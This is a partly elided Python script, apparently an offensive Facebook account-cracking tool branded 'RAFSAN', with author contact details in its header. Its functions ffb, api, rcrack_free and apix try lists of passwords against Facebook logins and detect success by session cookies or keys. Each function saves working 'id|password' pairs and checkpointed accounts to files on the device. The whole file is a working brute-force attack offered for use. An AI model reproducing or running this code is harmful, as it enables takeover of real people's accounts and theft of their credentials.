#RANA(SHOBUJ)(RAFSAN)
#WhatsApp : +60143624933
#Github :Rafsan-cyber-401
from os import path
...
██  ██████ ███████ ██      
    ...
    │ [✓] WHATSAPP : +60143624933         │
    │ [✓] VERSION  : 1.9                    │
    │ [✓] POWER BY : \033[1;32mKING RAFSAN\033[1;37m            │
    └───────────────────────────────────────┘""")                                           
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+88+60143624933?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [RAFSAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [RAFSAN-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/RAFSAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [RAFSAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RAFSAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [RAFSAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/RAFSAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[RAFSAN-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[RAFSAN-CP] '+idf+' | '+ps+'\033[0;97m')
...
def apix(ids,passlist):
    ...
    'cache-control': 'max-age=0',
    'referer': 'https://r.search.yahoo.com/_ylt=AwrKAkbdj1hkrsc8xk.kwyQ5;_ylu=Y29sbwMEcG9zAzEEdnRpZAMEc2VjA3Ny/RV=2/RE=1683554397/RO=10/RU=https%3a%2f%2fwww.facebook.com%2f/RK=2/RS=uvWquBeShLD4WZE03E3181BqCdY-',
